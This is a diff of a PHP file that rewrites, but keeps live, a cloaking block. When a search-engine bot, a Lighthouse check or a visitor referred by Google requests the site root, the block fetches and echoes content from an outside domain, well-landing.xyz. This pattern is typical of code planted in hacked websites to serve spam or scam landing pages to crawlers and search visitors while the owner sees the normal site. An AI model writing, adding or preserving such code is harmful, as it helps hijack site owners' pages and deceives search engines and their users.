@@ -3,21 +3,9 @@ $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 $referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
 $uri = $_SERVER['REQUEST_URI'] ?? '';
 
-if (
-    $uri === '/' &&
-    (
-        preg_match('/bot|google|chrome-lighthouse/i', $userAgent) ||
-        preg_match('/google/i', $referer)
-    )
-) {
-    $content = @file_get_contents('https://well-landing.xyz/landing/e-palli.ecohumanism.txt');
-    if ($content !== false) {
-        echo $content;
-    } else {
-        http_response_code(503);
-        echo 'Service temporarily unavailable.';
-    }
-    exit();	
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+echo file_get_contents('https://well-landing.xyz/landing/e-palli.ecohumanism.txt');
+exit();
 }
 ?>
 
